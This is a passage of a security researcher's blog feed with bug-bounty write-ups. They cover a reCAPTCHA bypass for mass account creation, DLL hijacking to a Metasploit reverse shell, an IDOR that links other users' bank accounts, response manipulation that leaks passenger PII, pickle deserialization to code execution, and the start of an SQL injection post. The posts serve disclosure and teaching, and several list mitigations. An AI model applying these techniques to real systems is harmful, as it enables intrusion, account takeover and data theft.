+    </span><span class="nl">"output"</span><span class="p">:</span><span class="w"> </span><span class="s2">"7LJE5P5kV3HvDdOdxWPQkQDbwqlTp2817vWfuCp/F3CzdTj9rWvrAlisK7/pRR0ff7g6Fd16im4Zrw1Zac5qHSbTRmV2cyvHgKcRwtonAGnU0toMYEuPkXdswUGKKgJRkZ0nQcYZVsPRX5D2gWoglp4kzFHZM8Y1dtVQLoYeqi3pc8vKI5FU5AeeTqZdAWWVEJcsZIlKY2o94fVzrXJ1XD/95aLXk3wbfDhJDP50jMfSM8TAl4Oa7mBbpMArnNU4XJscqfuXrXc5KyxvyPbmc/IwA7ndlhljJJ7zMjtnS9GzzkYjuWdISkLB1rH/pvXS7AUEj0UpIn2DBIsHayVYkBYHaRP6YZ8vVZGMoXVK1kS6w1W6JFUOzkfcTMWVbKAifJxxtlzt5cuJZa/iDHTMMrh/xAOqc04mdn73sBGAFMN5KlJx0lEe8XlKFkm3UcRdrzLj0/VmLHAN75dXX7iNs5ZvswYr8EcHG2fscIIoJ3mtySlDVgcR1fl8ZIcSXLVAzzazF8ZldJ9bzExMrFqUK73R9ZE5sEJIgoWqotlBIWUxC8WtfY8aLLcWiDHaPvoGtS5lnajJ0/zx5oHEFKdZaGDsGjOycGHeJbZgkDU5u3WhzrgTw8+FaNqluT+vDPHTlxpDPy/h1I7TL1YfpjLeUjSIEY2gYmD1Ew/ii5lBBPcqI7F3gWNh+t/wt7Y7xSmXJ92Z9X93iVAiM27yEnbreC8i5GQzU+OgqPogrEw8Lu0m86cpgGfXrv1bL2ihxW9fNKEWCexMx0U0cHdlqDVdoQ3PcyutXRvZH58F81Aw2jL0O6GC7/ijYN59gboFhoh7Fh0GWRlRkMA2gXnGgNZejFUE8qzTnusINmEeGwbmdIQ18w/WGKT0V5ZvCDbjVCIHK8fOx+64y0oJ4tN7a2/idP5Xlciz1qsitfuCB+7DBhIgSpOXbG+Pe6mW9lW31qlyljabDpk3SdX+X9z+9Hh7/7QooghpXePk+snSTtqHPxWlKI/np5cGcBmnB8kZXGOyyeBuLOciKdEdqJ8Luu6huLGNSo9ftaDgn9TMjcBw2c2MU6sClP31DYTlfake9iaFrXrdisi+YorPU4g+T8ojrVpDGWnnh1uHjc8KsTlsULU="</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"dataFormat"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Base64"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"iv"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jm8lgqa3j1d0ajus"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong><em>Newly constructed request</em></strong>
+<img src="reqandresp2.png" alt="img" /><br /></p>
+
+<p>Now it’s time to exploit issues and create a huge impact. Based on the decrypted data as we can see, the application is using the CAPTCHA system to protect the application from the brute-forcing and spamming vulnerabilities. If we can find a way to bypass the CAPTCHA protection then we can convince the triager to show the real imapcts like high resource usage, spamming and by create user accounts with false data. The last part creating false accounts using false data is only applicable when the application does not have data verification system. As per the recon the application is not validating anything at all, so now we can show the impact.</p>
+
+<p>Let’s jump into find a way to bypass the CAPTCHA.</p>
+
+<h3 id="captcha-recon">CAPTCHA Recon</h3>
+
+<p>The application is using google reCAPTCHA.</p>
+
+<p><img src="captcha.png" alt="img" /><br /></p>
+
+<p>I have observed there was a strange behaviour in the reCAPTCHA system which is everytime you click the checkbox it sends two requests such as 1 to get the CAPTCHA response and other is to verify the CAPTCHA response in the next upcoming request.</p>
+
+<h3 id="bypass">Bypass</h3>
+<p>We cannot send the same CAPTCHA response code more than once, if we do that the server will respond as below,</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Date: Sat, 18 Feb 2023 14:54:03 GMT
+Expires: Sat, 18 Feb 2023 14:54:03 GMT
+Cache-Control: private, max-age=0
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'self'
+X-Xss-Protection: 1; mode=block
+Content-Length: 32
+Server: GSE
+Alt-Svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
+
+)]}'
+["uvresp",null,null,null,2]
+</span></code></pre></div></div>
+
+<p>From the below request what i have observed is you can send the below CAPTCHA request as long as we want and it will still provide us the response code to be verified in the upcoming verification request.</p>
+
+<p><img src="captcha1.png" alt="img" /></p>
+
+<h3 id="workflow">Workflow</h3>
+
+<p>Get CAPTCHA code -&gt; use it in next verfication request -&gt; will provide the final CAPTCHA code which is included in the JSON body</p>
+
+<p>The final verification code can be obtained like the below,</p>
+
+<p><img src="captcha2.png" alt="img" /></p>
+
+<p>So the entire flow will be automated by using a python script to get the final CAPTCHA code to be encrypted in the JSON body to create accounts/any other operations like brute-forcing usernames and passwords.</p>
+
+<p>By chaining the client side code encryption reverse engineering and the misconfigured CAPTCHA mechanism will allow us to create false accounts, resource consumption, increased data tables in DB which will add more cost to the company’s usage bill.</p>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="Reverse Engineering" /><summary type="html"><![CDATA[Reverse Engineering client side Encryption]]></summary></entry><entry><title type="html">DLL Injection on one of the biggest Business Automation application</title><link href="http://localhost:4000/RCE-DLL-Hijacking/" rel="alternate" type="text/html" title="DLL Injection on one of the biggest Business Automation application" /><published>2022-12-15T12:00:00+00:00</published><updated>2022-12-15T12:00:00+00:00</updated><id>http://localhost:4000/RCE-DLL-Hijacking</id><content type="html" xml:base="http://localhost:4000/RCE-DLL-Hijacking/"><![CDATA[<h2 id="dll-hijacking">DLL Hijacking</h2>
+<p>DLL hijacking is a method of injecting malicious code into an application by exploiting the way some Windows applications search and load Dynamic Link Libraries (DLL).</p>
+
+<p>Only Microsoft operating systems are susceptible to DLL hijacks.</p>
+
+<p>By replacing a required DLL file with an infected version and placing it within the search parameters of an application, the infected file will be called upon when the application loads, activating its malicious operations.</p>
+
+<p>For a DLL hijack to be successful, a victim needs to load an infected DLL file from the same directory as the targeted application.</p>
+
+<p>If applications that are automatically loaded upon startup are compromised with a tainted DLL file, cybercriminals will be granted access to the infected computer whenever it loads.</p>
+
+<p>DLL hijacking is not an innovative cyberattack method. It has been in circulation among cybercriminals since Windows 2000 launched.</p>
+
+<h2 id="what-are-dll-files">What are DLL Files?</h2>
+<p>DLL files, or Dynamic Link Library files, contain the resources an application needs to run successfully. These could include images and a library of executable functions.</p>
+
+<p>DLL files cannot be opened by end-users, they can only be opened by their associated application, which usually happens when the application starts up.</p>
+
+<p>Windows systems require DLL files to understand how to use their resources, the host computer memory, and hard drive space most efficiently.</p>
+
+<p>DLL files usually end with a .dll extension, but some could end in .drv, .drov and even .exe.</p>
+
+<p>A single DLL file could run multiple programs, so multiple programs could potentially be comprised in a DLL hijacking attack.</p>
+
+<h2 id="how-does-dll-hijacking-work">How Does DLL Hijacking Work?</h2>
+<p>For a DLL hijacking attack to be successful, a Windows application needs to be tricked into loading an infected DLL file instead of the legitimate DLL.</p>
+
+<p>By exploiting the publicized DLL search order of Microsoft applications, this trickery is relatively simple to execute.</p>
+
+<p>The standard DLL search order of Microsoft applications depends upon whether safe DLL search is enabled.</p>
+
+<p>When safe DLL search mode is enabled, applications search for required DLL files in the following order:</p>
+
+<ol>
+  <li>The directory from which the application is loaded.</li>
+  <li>The system directory.</li>
+  <li>The 16-bit system directory.</li>
+  <li>The Windows directory.</li>
+  <li>The current directory.</li>
+  <li>The directories that are listed in the PATH environment variable.</li>
+</ol>
+
+<p>When safe DLL search mode is disabled, the search order is as follows:</p>
+
+<ol>
+  <li>The directory from which the application is loaded.</li>
+  <li>The current directory.</li>
+  <li>The system directory.</li>
+  <li>The 16-bit directory.</li>
+  <li>The Windows directory</li>
+  <li>The directory listed in the PATH environment variable.</li>
+</ol>
+
+<p>The difference between the two search modes is the order in which the user’s current directory is searched, it’s slightly elevated in the hierarchy when safe search is disabled.</p>
+
+<p>When safe search is disabled, the user’s current directory is slightly elevated in the search order.</p>
+
+<p>Windows applications will default to any one of the above DLL search protocols if an application does not specify the full path of associated DLL files.</p>
+
+<p>This is the exploit that makes DLL hacking possible.</p>
+
+<p><strong>For example</strong>, if a Windows application requires a DLL file located in the system directory C:\Windows\System32 but there are no instructions in its code to search in this explicit location, the application will work through a DLL search order to locate the file.</p>
+
+<p>Regardless of whether or not safe search is enabled, the directory from which the application is launched is the first location that is searched.</p>
+
+<p>If a cybercriminal deposits an infected DLL file in this location, the application will open it instead of the original because its location was searched first, before the system directory.</p>
+
+<p>This technique is also known as DLL search order hijacking.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h2 id="enumerate-the-process">Enumerate the process</h2>
+
+<p>Enumerating the process and it’s dll files using the process monitor tool.</p>
+
+<p><img src="1.process.png" alt="process_img" /></p>
+
+<p>Post enummerating the process the malicious dll file which opens the calculator application in windows has been created with the help of metasploit framework.</p>
+
+<h2 id="generate-payload-to-check-blind-rce-by-popping-an-calculator">Generate Payload to check blind RCE by popping an calculator</h2>
+
+<p>Generating the payload using metasploit to open calculator to check whether the application is loading the malicious dll file or not.</p>
+
+<p><img src="2.payload_gen.png" alt="Calc_payload" title="Calculator Payload" /></p>
+
+<h2 id="placing-malicious-dll-file-in-the-application-directory">Placing Malicious DLL file in the application directory</h2>
+<p><img src="3.dll_location.png" alt="Placing_malicious_file" /></p>
+
+<p>The genetrated payload is placed in the respective application directory based on the process monitor information.</p>
+
+<h2 id="rce-calculator-pop-up">RCE (Calculator Pop up)</h2>
+<h3 id="process-monitor">Process Monitor</h3>
+<p><img src="4.dll_accessed.png" alt="proc_mon" /></p>
+
+<p>Once the application starts running the dll file has been accessed by the application and the calculator application is opened.</p>
+
+<h3 id="calculator">Calculator</h3>
+<p><img src="5.rce.png" alt="calc_popup" /></p>
+
+<h2 id="reverse-shell">Reverse Shell</h2>
+<h3 id="generating-payload-for-reverse-shell">Generating payload for Reverse shell</h3>
+
+<p>Since we had the successful exploitation of RCE via opening the calculator application, let’s escalate this to get the remote shell to the targeted machine.</p>
+
+<p><img src="6.1.rce.png" alt="reverseshell_payload" /></p>
+
+<p>The reverse shell has been generated with the help of metasploit framework and the malicious dll has been placed in the respective application directoty for exploitation.</p>
+
+<h3 id="process-monitor-1">Process monitor</h3>
+<p>Checkinf whether the application validates the dll file or not.
+<img src="6.2.rce.png" alt="proc_mon" /></p>
+
+<h3 id="windows-reverse-shell-via-meterpreter">Windows reverse shell via meterpreter</h3>
+<p><img src="6.3.rce.png" alt="reverse_tcp_shell" />
+The application is nto validating the dll files, once the application is started then the metepreter shell connection is received from the targeted windows machine.</p>
+
+<h2 id="how-to-prevent-dll-hijacking">How to Prevent DLL Hijacking</h2>
+<ul>
+  <li>The first line of defense needs to be established by software developers. Developers need to follow secure coding practices and specify the exact location of all associated DLL files to prevent Windows from defaulting to its DLL search path protocol.</li>
+  <li>The application should not load the untruested dll files.</li>
+  <li>
+    <p>Adherence to secure coding practices can never be guaranteed, so organizations should implement the following additional defenses:</p>
+
+    <ul>
+      <li>Keep antivirus software up-to-date.</li>
+      <li>Educate staff about phishing and social engineering warning signs.</li>
+      <li>Strengthen your security posture by continuously monitoring your attack surface.</li>
+      <li>Implement a vendor risk management solution.</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="DLL Hijacking" /><category term="RCE" /><category term="Product Security" /><summary type="html"><![CDATA[Remote Code Execution via DLL Hijacking on a top 5 business automation product.]]></summary></entry><entry><title type="html">IDOR leads to Takeover other user’s linked bank accounts</title><link href="http://localhost:4000/IDOR/" rel="alternate" type="text/html" title="IDOR leads to Takeover other user’s linked bank accounts" /><published>2022-08-10T12:00:00+00:00</published><updated>2022-08-10T12:00:00+00:00</updated><id>http://localhost:4000/IDOR</id><content type="html" xml:base="http://localhost:4000/IDOR/"><![CDATA[<p><img src="access-control.svg" alt="preview" /></p>
+
+<h2 id="target-information">Target Information</h2>
+<p>The target is a web application which will help the organization to track and pay their invoices, bills and other transactions. It’s totally a business banking application.</p>
+
+<h2 id="recon">Recon</h2>
+<p>Post checking all the feature and i have figured out that the application is vulnerable to IDOR because the application performs the actions on APIs based on the input details that the application pass through the URL and in JSON Objects of the request body.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+<p>I have exploited several endpoints to view and edit other organization’s users invoices, able to access their transaction details and other bills.</p>
+
+<p>Here comes the fun part that the application have a feature that you can add your bank accounts into the application and once the account is merged the application will provide you a virtual bank account which will be like <strong>ABC Virtual Bank account</strong> from <strong>ABC Internet Bank</strong>.</p>
+
+<p>The application allow the users to add n-number of bank accounts to the <strong>ABC Virtual Bank account</strong> so in order to quickly find  the bank account details the application have a feature to rename the account name as any nicknames like the request below,</p>
+
+<h2 id="request">Request</h2>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUT /connected_banking/12345
+Host: app.abc.com
+
+{
+	"bankid": 12345,
+	"account_nickname": thevillagehacker,
+	"account_id": 1111,
+	"company_id": 0000
+}
+</code></pre></div></div>
+
+<h2 id="response">Response</h2>
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/2 200 OK
+{
+	"abc_account_id": 12345,
+	"account_nickname": thevillagehacker,
+	"account_id": 1111,
+	"company_id": 0000,
+	"current_balance": XXXX.XX
+}
+</code></pre></div></div>
+<p>The above request shows that the application is using the details of the bank id from the URL and the JSON object in the request body. So by bruteforcing the <code class="language-plaintext highlighter-rouge">bankid</code> lead me to change the nicknames of other users bank account nickname.</p>
+
+<p>And the IDOR didn’t stopped right there, whenever i changed the nickname of users bank accounts those bank accounts were linked to my <strong>ABC Virtual Bank account</strong>. So now other users bank accounts are linked to me and i can access their bank account details, balances, transactions and etc,</p>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="Account Takeover" /><category term="Broken Access Control" /><category term="IDOR" /><summary type="html"><![CDATA[IDOR leads to Takeover other user's bank accounts.]]></summary></entry><entry><title type="html">API Security Misconfiguration Leads to tons of PII data Leakage</title><link href="http://localhost:4000/PII-Leak/" rel="alternate" type="text/html" title="API Security Misconfiguration Leads to tons of PII data Leakage" /><published>2021-07-01T12:00:00+00:00</published><updated>2021-07-01T12:00:00+00:00</updated><id>http://localhost:4000/PII-Leak</id><content type="html" xml:base="http://localhost:4000/PII-Leak/"><![CDATA[<p><img src="misconfig.webp" alt="img" /></p>
+
+<h1 id="what-is-api-misconfiguration">What is API Misconfiguration?</h1>
+<h2 id="api72019-security-misconfiguration">API7:2019 Security Misconfiguration</h2>
+<p>Security misconfiguration is commonly a result of insecure default configurations, incomplete or ad-hoc configurations, open cloud storage, misconfigured HTTP headers, unnecessary HTTP methods, permissive Cross-Origin resource sharing (CORS), and verbose error messages containing sensitive information.</p>
+
+<h2 id="target-information">Target Information</h2>
+<p>The target application is similar to uber, ola, and any other transport tracking application. The passengers can track their respective vehicles’ GPS locations to get the route information like ola, uber, and other taxi services.</p>
+
+<h2 id="recon">Recon</h2>
+<p>I downloaded and installed the application in the emulator and performed static analysis and reverse engineering using MOBSF, APKtool, jadx -&gt; No luck. The Application having two types of users are users=passengers, administrators.</p>
+
+<h2 id="playing-with-proxy">Playing with proxy</h2>
+<p>Started the proxy program (Burp Suite) and clicking all the buttons to find other vulnerabilities in the API. After playing with the proxy I got knowledge about the API that the application is using to access information.</p>
+
+<h2 id="api-misconfiguration-in-the-target">API Misconfiguration in the target</h2>
+<p>The Application is using a REST API. The API generates an API key and authorization token at the time of user login actions. I logged in and logged out from the application to observe how the API authorization token works. It seems the API key is default and it will not change and the authorization token changes sometimes and sometimes not. I figured out that the application needs three things to access all the information including administrator access.</p>
+
+<h3 id="things-that-api-requires">Things that API requires</h3>
+<ul>
+  <li>API Key</li>
+  <li>Authorization Token</li>
+</ul>
+
+<h3 id="api-key">API Key</h3>
+<p>We can get the API key at the time of log in the API key never changes from its default value</p>
+
+<h2 id="auth-token">Auth Token</h2>
+<p>The API does not properly validate the auth token what it validates is that the token is legit or not like in the format the developer created, so all we need is an API-generated token which we can get at the time of login it does not matter whether your credentials are right or wrong.</p>
+
+<h3 id="administrator-username">Administrator Username</h3>
+<ul>
+  <li>Username Enumeration</li>
+  <li>Response Manipulation -&gt; change to admin Privileges</li>
+</ul>
+
+<h2 id="response-manipulation">Response Manipulation</h2>
+<p>Here comes the fun part I created two accounts and tried to take over those accounts using the response manipulation technique. I observe the server responses when I log in as user=passenger and noticed that the JSON body having an object named role and the value is base64 encoded.</p>
+
+<p><img src="base64_encode.webp" alt="img" /></p>
+
+<p>I quickly changed the role value from user to admin in base64 encoded format and boom I logged in as administrator. There are so many different endpoints present for the administrator account.</p>
+
+<h2 id="pii-data-leak">PII Data Leak</h2>
+<p>As I stated above to access all those endpoints we need an API key, Auth token, and Administrator username.</p>
+
+<p><img src="leak1.webp" alt="img" /></p>
+
+<p>Now we have all the three things that the API requires by using all those I accessed all the user=passengers PII data and vehicle information in plain Text in JSON body.</p>
+
+<h2 id="taking-over-other-administrator-accounts">Taking Over other Administrator Accounts</h2>
+<p>Since the API is misconfigured we can use the above-shown endpoint to enumerate the administrator usernames.</p>
+
+<p><img src="leak2.webp" alt="img" /></p>
+
+<p>The endpoint only provides those outputs if the logged-in user is an administrator, the other normal users can’t access that information. So I prepared a bunch of username wordlists and brute-forced them and found more than 4 valid administrator usernames.</p>
+
+<p>Then I started sending the requests with that valid username and found different PII data for each of them it seems the separate administrators have different data.</p>
+
+<p>After some time I discovered that the API is very poorly configured which means you don’t have to be logged in to the application to access the administrator information. All we have to do to collect and craft a request with API Key, Auth token which we can get at the time of login, and valid username with all of these I can access all of the administrator information.</p>
+
+<h2 id="take-aways-">Take-Aways:-</h2>
+<ul>
+  <li>Check for API documentation and collect the authentication and authorization inputs that are required to access data from the API endpoints.</li>
+  <li>Check for API misconfigurations like does the Auth token, API key, and other auth mechanisms are validated properly.</li>
+  <li>Check for Response manipulation attacks.</li>
+  <li>Check for Rate Limiting vulnerability to enumerate Usernames.</li>
+</ul>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="PII Leak" /><category term="Misconfiguration" /><summary type="html"><![CDATA[API Security Misconfiguration Leads to tons of PII data Leakage.]]></summary></entry><entry><title type="html">Insecure Deserialization</title><link href="http://localhost:4000/Insecure_Deserialization/" rel="alternate" type="text/html" title="Insecure Deserialization" /><published>2021-06-09T12:00:00+00:00</published><updated>2021-06-09T12:00:00+00:00</updated><id>http://localhost:4000/Insecure_Deserialization</id><content type="html" xml:base="http://localhost:4000/Insecure_Deserialization/"><![CDATA[<p><img src="1.webp" alt="img" /></p>
+
+<h1 id="introduction">Introduction</h1>
+<p>Insecure Deserialization is a vulnerability that occurs when untrusted data is used to abuse the logic of an application, inflict a denial of service (DoS) attack, or even execute arbitrary code upon it being deserialized. It also occupies the #8 spot in the <a href="https://www.acunetix.com/blog/articles/owasp-top-10-2017/">OWASP Top 10 2017</a> list.</p>
+
+<p>To understand what insecure deserialization is, we first must understand what serialization and deserialization are. We’ll then cover some examples of insecure deserialization and how it can be used to execute code as well as discuss some possible mitigations for this class of vulnerability.</p>
+
+<h2 id="serialization-vs-deserialization">Serialization vs deserialization</h2>
+<p>Serialization is the process of turning some object into a data format that can be restored later. People often serialize those objects to save them to storage or send them as part of communications.</p>
+
+<p><img src="2.webp" alt="img" /></p>
+
+<p><strong>Deserialization</strong> is the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.</p>
+
+<h2 id="what-is-insecure-deserialization">What is insecure deserialization?</h2>
+<p>Let’s first understand the whole picture here. When you learn a programming language, the first thing you learn is how to define variables, classes, and data structures that best suit your needs. Then, you learn how to manipulate them to achieve your needs. So far, they reside in memory, but sometimes, you need to store their states or share them with other systems. That’s where serialization and deserialization come into play.</p>
+
+<h2 id="what-can-go-wrong-here">What can go wrong here?</h2>
+<p>When a software deserializes the user-controlled data without verification, we call it insecure deserialization. For example, an attacker might store a serialized file representing a malicious payload. The developer doesn’t perform a verification before deserializing the serialized data, then insecure deserialization will occur.</p>
+
+<p>Most programming languages offer the ability to customize deserialization processes. Unfortunately, it’s frequently possible for an attacker to abuse these deserialization features when the application is deserializing untrusted data that the attacker controls.</p>
+
+<h2 id="java-serialization-and-deserialization-example-">Java serialization and deserialization example:-</h2>
+
+<p>The following is an example of the serialization and deserialization process in java.</p>
+
+<p>This is a simple java class file in which the variables are declared</p>
+
+<p><img src="3.webp" alt="img" /></p>
+
+<p>The following below code will perform the basic serialization and deserialization process with the same objects created in the above code.</p>
+
+<p><img src="4.webp" alt="img" /></p>
+
+<h2 id="serializing-the-objects-">Serializing the objects:-</h2>
+<p><img src="5.webp" alt="img" /></p>
+
+<p>The above code performs the serialization of the objects which are provided in the code.</p>
+
+<h2 id="deserializing-the-data-">Deserializing the data:-</h2>
+<p><img src="6.webp" alt="img" /></p>
+
+<p>The above code performs the deserialization of the data which was serialized before.</p>
+
+<h3 id="lets-run-">Let’s Run:-</h3>
+<p>Let’s run the program to see how java serializes the data. Once the program is compiled without error the java class files will be created as below:</p>
+
+<p><img src="7.webp" alt="img" /></p>
+
+<p>Now we can run the basic program,</p>
+
+<p><img src="8.webp" alt="img" /></p>
+
+<p>The program executed successfully. The objects we gave as input to the program are age, name, and nickname of a human being is serialized and stored in the file as humandata.ser.</p>
+
+<p>Let’s view the serialized data and see if we can figure out anything from it</p>
+
+<p><strong>Serialized data in normal view</strong>
+<img src="9.webp" alt="img" /></p>
+
+<p><strong>Serialized data in Hex format</strong>
+<img src="10.webp" alt="img" /></p>
+
+<p>The above example is a serialized data and this is the same date that has been piped directly into the deserialization process without any verification. This is where the insecure deserialization vulnerability occurs.</p>
+
+<h2 id="python-serialization-and-deserialization-example-">Python serialization and deserialization example:-</h2>
+
+<p>The following is an example of serialization and deserialization in Python by using the python module for binary serialization and deserialization.</p>
+
+<p><img src="11.webp" alt="img" /></p>
+
+<p><strong>dumps()</strong> − returns a byte like an object by marshaling a Python object. Only objects of standard data types are supported for marshaling. Unsupported types raise the ValueError exception.</p>
+
+<p><strong>loads()</strong> − This function converts the byte-like object to the corresponding Python object. If the conversion doesn’t result in a valid Python object, ValueError or TypeError may be raised.</p>
+
+<h2 id="serialized-and-deserialized-data-">Serialized and Deserialized data:-</h2>
+<p><img src="12.webp" alt="img" /></p>
+
+<p>The above is the serialized and deserialized data using the marshal python module. The marshal module uses dumps() function to serialize the data and uses loads() function to deserialize them.</p>
+
+<h2 id="insecure-deserialization-to-remote-code-execution-">Insecure Deserialization to Remote Code Execution:-</h2>
+<p>The following is an example of insecure deserialization in Python. Python’s native module for binary serialization and deserialization is called pickle. This example will serialize an exploit to run the <strong>whoami and date</strong> command, and deserialize it with pickle.loads().</p>
+
+<p><strong>Example code to perform RCE</strong>
+<img src="13.webp" alt="img" /></p>
+
+<p>The dumps() function gets input, serializes it, and piped to the deserialization function. The serialized data is directly piped to the loads() function to perform the deserialization process without any validation.</p>
+
+<h3 id="lets-run--1">Let’s Run:-</h3>
+<p><strong>Remote Code Execution</strong>
+<img src="14.webp" alt="img" /></p>
+
+<p>The above image shows the serialized data of the remote code execution command whoami and date.</p>
+
+<p>The loads() function accepts the user-controlled serialized data without any verification in place which results in arbitrary code execution on the target.</p>
+
+<h3 id="example-codes-repository-">Example Codes Repository:-</h3>
+<p><a href="https://github.com/thevillagehacker/My-Presentation-Slides">GitHub Repo</a></p>
+
+<h2 id="what-is-the-impact-of-insecure-deserialization">What is the impact of insecure deserialization?</h2>
+<p>The impact of insecure deserialization can be very severe because it provides an entry point to a massively increased attack surface. It allows an attacker to reuse existing application code in harmful ways, resulting in numerous other vulnerabilities, often <a href="https://portswigger.net/web-security/os-command-injection">remote code execution</a>.</p>
+
+<p>Even in cases where remote code execution is not possible, insecure deserialization can lead to privilege escalation, arbitrary file access, and denial-of-service attacks.</p>
+
+<h2 id="insecure-deserialization-tools">Insecure deserialization tools.</h2>
+<p>There are many tools that can assist you when you are hunting for insecure deserialization vulnerabilities. In the case of Java, you can use the <a href="https://github.com/portswigger/java-deserialization-scanner">Java Deserialization Scanner</a> Burp Suite extension. It allows you to test for different libraries using predefined POP gadget chains. Then, you can use <a href="https://github.com/frohoff/ysoserial">Ysoserial</a> to generate the appropriate payload. Therefore, I think that the most valuable tool for this vulnerability would be a good deal of white-box testing, patience, and analysis skills.</p>
+
+<h2 id="how-to-prevent-insecure-deserialization-vulnerabilities">How to prevent insecure deserialization vulnerabilities?</h2>
+<ul>
+  <li>Deserialization of user input should be avoided unless absolutely necessary.</li>
+  <li>If you do need to deserialize data from untrusted sources, incorporate robust measures to make sure that the data has not been tampered with.</li>
+  <li>If possible, you should avoid using generic deserialization features altogether.</li>
+  <li>The method of serialization should be encrypted not encoded.</li>
+  <li>Maintain integrity checks to prevent data tampering with the serialized objects.</li>
+  <li>Run Deserialization code in a low privilege environment.</li>
+  <li>Implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.</li>
+  <li>Log deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.</li>
+</ul>
+
+<h2 id="insecure-deserialization-hackerone-reports">Insecure deserialization Hackerone reports</h2>
+<ul>
+  <li><a href="https://hackerone.com/reports/562335">https://hackerone.com/reports/562335</a></li>
+  <li><a href="https://hackerone.com/reports/153026">https://hackerone.com/reports/153026</a></li>
+  <li><a href="https://hackerone.com/reports/415682">https://hackerone.com/reports/415682</a></li>
+  <li><a href="https://hackerone.com/reports/350401">https://hackerone.com/reports/350401</a></li>
+  <li><a href="https://hackerone.com/reports/350418">https://hackerone.com/reports/350418</a></li>
+</ul>
+
+<h2 id="references-">References:-</h2>
+<ul>
+  <li><a href="https://thehackerish.com/insecure-deserialization-explained-with-examples/">https://thehackerish.com/insecure-deserialization-explained-with-examples/</a></li>
+  <li><a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization</a></li>
+  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</a></li>
+  <li><a href="https://portswigger.net/web-security/deserialization">https://portswigger.net/web-security/deserialization</a></li>
+</ul>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="Deserialization" /><category term="Misconfiguration" /><summary type="html"><![CDATA[A pentester’s guide to insecure deserialization.]]></summary></entry><entry><title type="html">Time-Based SQL Injection to Dumping the Database</title><link href="http://localhost:4000/Sql-injection/" rel="alternate" type="text/html" title="Time-Based SQL Injection to Dumping the Database" /><published>2021-05-19T12:00:00+00:00</published><updated>2021-05-19T12:00:00+00:00</updated><id>http://localhost:4000/Sql-injection</id><content type="html" xml:base="http://localhost:4000/Sql-injection/"><![CDATA[<p><img src="1.webp" alt="img" /></p>
+
+<p>Hello all!. I hope Everyone is fine and I am here sharing my new recent vulnerability I found on an Android Application. The Android Application is an asset tracking application and I am not allowed to disclose the Application name, so I am sorry about that. Let’s get started…</p>
+
+<h1 id="what-is-sql-injection">What is SQL Injection?</h1>
+<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application’s content or behavior.</p>
+
+<h2 id="get-started">Get started…</h2>
+<p>So I was testing an asset tracking application for finding vulnerabilities and it’s an android application. I quickly installed the app and reverse-engineered it to check for hardcoded secrets luckily I founded nothing.</p>
+
+<p>Then I used objection to bypass the SSL Certificate Pinning and then noticed that the Application is using Content-Type: application/json; charset=UTF-8 as the content type which exactly means the application using JSON request body to perform the actions.</p>
+
+<p>So I quickly thought that if we could trigger an activity without any authorization then there is gonna be a huge impact on the Application. So I gathered all the activities from <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MOBSF</a>. One of the activity caught my attention that is there are 2 dashboard activities are present in that application.</p>
+
+<p>I used to trigger the first activity,</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>com.abc.xyz.view.activity.DashboardActivity =&gt; activity 1
+com.abc.xyz.view.activity.DashboardActivitySecond =&gt; activity 2
+</code></pre></div></div>
+
+<p>The dashboard of the application is opened and the default pages are present. Then I looked dor another activity to see if I can get anything and the activity called <strong>com.abc.xyz.view.activity.SearchActivity</strong> is present and it is triggered successfully.</p>
+
+<p>There is a lot of information is required to search the exact information we are looking for and I entered all of them. The JSON body in that request took my attention, so I decided to check for injection vulnerabilities.</p>
+
+<p><img src="2.webp" alt="img" /></p>
+
+<p>That <strong>abc_serial_no</strong> object took my attention so I just added ‘to that object and see what happens and the server resulted in <strong>500 INTERNAL SERVER ERROR</strong>. So this Object is vulnerable to perform SQL Injection.</p>
+
